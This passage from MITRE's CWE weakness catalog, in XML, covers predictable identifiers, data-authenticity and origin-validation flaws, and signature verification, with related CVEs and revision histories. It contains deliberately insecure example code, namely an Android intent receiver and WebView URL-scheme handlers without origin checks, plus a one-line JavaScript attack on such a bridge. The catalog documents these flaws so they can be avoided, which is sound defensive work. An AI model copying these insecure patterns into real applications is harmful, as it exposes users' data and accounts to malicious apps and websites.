               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Non-cryptographic PRNG</Previous_Entry_Name>
            <Previous_Entry_Name Date="2014-06-23">Use of Cryptographically Weak PRNG</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="340" Name="Generation of Predictable Numbers or Identifiers" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product uses a scheme that generates numbers or identifiers that are more predictable than required.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="330" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Predictability problems</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>11</Entry_ID>
               <Entry_Name>Brute Force</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 20: Weak Random Numbers.&#34; Page 299"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2020-02-24">Predictability Problems</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="345" Name="Insufficient Verification of Data Authenticity" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-153">
               <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
               <Body_Text>Multiple vendors did not sign firmware images.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-30260</Reference>
               <Description>Distributed Control System (DCS) does not sign firmware images and only relies on insecure checksums for integrity checks</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30260</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30267</Reference>
               <Description>Distributed Control System (DCS) does not sign firmware images and only relies on insecure checksums for integrity checks</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30267</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30272</Reference>
               <Description>Remote Terminal Unit (RTU) does not use signatures for firmware images and relies on insecure checksums</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30272</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Insufficient Verification of Data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>12</Entry_ID>
               <Entry_Name>Content Spoofing</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="111"/>
            <Related_Attack_Pattern CAPEC_ID="141"/>
            <Related_Attack_Pattern CAPEC_ID="142"/>
            <Related_Attack_Pattern CAPEC_ID="148"/>
            <Related_Attack_Pattern CAPEC_ID="218"/>
            <Related_Attack_Pattern CAPEC_ID="384"/>
            <Related_Attack_Pattern CAPEC_ID="385"/>
            <Related_Attack_Pattern CAPEC_ID="386"/>
            <Related_Attack_Pattern CAPEC_ID="387"/>
            <Related_Attack_Pattern CAPEC_ID="388"/>
            <Related_Attack_Pattern CAPEC_ID="665"/>
            <Related_Attack_Pattern CAPEC_ID="701"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 15: Not Updating Easily.&#34; Page 231"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Notes>
            <Note Type="Relationship">"origin validation" could fall under this.</Note>
            <Note Type="Maintenance">The specific ways in which the origin is not properly identified should be laid out as separate weaknesses. In some sense, this is more like a category.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, References, Related_Attack_Patterns</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Insufficient Verification of Data</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="346" Name="Origin Validation Error" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not properly verify that the source of data or communication is valid.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Varies by Context</Impact>
               <Note>An attacker can access any functionality that is inadvertently accessible to the source.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-112">
               <Intro_Text>This Android application will remove a user account when it receives an intent to do so:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>IntentFilter filter = new IntentFilter("com.example.RemoveUser");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);<xhtml:br/>
                     <xhtml:br/>public class DeleteReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">int userID = intent.getIntExtra("userID");<xhtml:br/>destroyUserData(userID);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-109">
               <Intro_Text>These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:i>// Android</xhtml:i>
                     <xhtml:br/>@Override<xhtml:br/>public boolean shouldOverrideUrlLoading(WebView view, String url){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){<xhtml:div style="margin-left:1em;">if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){<xhtml:div style="margin-left:1em;">writeDataToView(view, UserData);<xhtml:br/>return false;</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">return true;</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Objective-C">
                  <xhtml:div>
                     <xhtml:i>// iOS</xhtml:i>
                     <xhtml:br/>-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                        <xhtml:div>NSURL *URL = [exRequest URL];<xhtml:br/>if ([[URL scheme] isEqualToString:@"exampleScheme"])<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                              <xhtml:div>NSString *functionString = [URL resourceSpecifier];<xhtml:br/>if ([functionString hasPrefix:@"specialFunction"])<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>// Make data available back in webview.</xhtml:i>
                                       <xhtml:br/>UIWebView *webView = [self writeDataToView:[URL query]];</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>return NO;</xhtml:div>
                           </xhtml:div>}<xhtml:br/>return YES;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>A call into native code can then be initiated by passing parameters within the URL:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>window.location = examplescheme://method?parameter=value</xhtml:div>
               </Example_Code>
               <Body_Text>Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2000-1218</Reference>
               <Description>DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-1218</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0877</Reference>
               <Description>DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0877</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1452</Reference>
               <Description>DNS server caches glue records received from non-delegated name servers</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1452</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2188</Reference>
               <Description>user ID obtained from untrusted source (URL)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2188</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0174</Reference>
               <Description>LDAP service does not verify if a particular attribute was set by the LDAP server</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1549</Reference>
               <Description>product does not sufficiently distinguish external HTML from internal, potentially dangerous HTML, allowing bypass using special strings in the page title. Overlaps special elements.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1549</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0981</Reference>
               <Description>product records the reverse DNS name of a visitor in the logs, allowing spoofing and resultant XSS.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0981</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Origin Validation Error</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="111"/>
            <Related_Attack_Pattern CAPEC_ID="141"/>
            <Related_Attack_Pattern CAPEC_ID="142"/>
            <Related_Attack_Pattern CAPEC_ID="160"/>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="384"/>
            <Related_Attack_Pattern CAPEC_ID="385"/>
            <Related_Attack_Pattern CAPEC_ID="386"/>
            <Related_Attack_Pattern CAPEC_ID="387"/>
            <Related_Attack_Pattern CAPEC_ID="388"/>
            <Related_Attack_Pattern CAPEC_ID="510"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="89"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-324"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry has some significant overlap with other CWE entries and may need some clarification. See terminology notes.</Note>
            <Note Type="Terminology">The "Origin Validation Error" term was originally used in a 1995 thesis [REF-324]. Although not formally defined, an issue is considered to be an origin validation error if either (1) "an object [accepts] input from an unauthorized subject," or (2) "the system [fails] to properly or completely authenticate a subject." A later section says that an origin validation error can occur when the system (1) "does not properly authenticate a user or process" or (2) "does not properly authenticate the shared data or libraries." The only example provided in the thesis (covered by OSVDB:57615) involves a setuid program running command-line arguments without dropping privileges. So, this definition (and its examples in the thesis) effectively cover other weaknesses such as CWE-287 (Improper Authentication), CWE-285 (Improper Authorization), and CWE-250 (Execution with Unnecessary Privileges). There appears to be little usage of this term today, except in the SecurityFocus vulnerability database, where the term is used for a variety of issues, including web-browser problems that allow violation of the Same Origin Policy and improper validation of the source of an incoming message.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Maintenance_Notes, References, Relationship_Notes, Relationships, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Terminology_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Type</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="347" Name="Improper Verification of Cryptographic Signature" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not verify, or incorrectly verifies, the cryptographic signature for data.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>An attacker could gain access to sensitive data and possibly execute unauthorized code.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following code, a JarFile object is created from a downloaded file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>File f = new File(downloadedFilePath);<xhtml:br/>JarFile jf = new JarFile(f);</xhtml:div>
               </Example_Code>
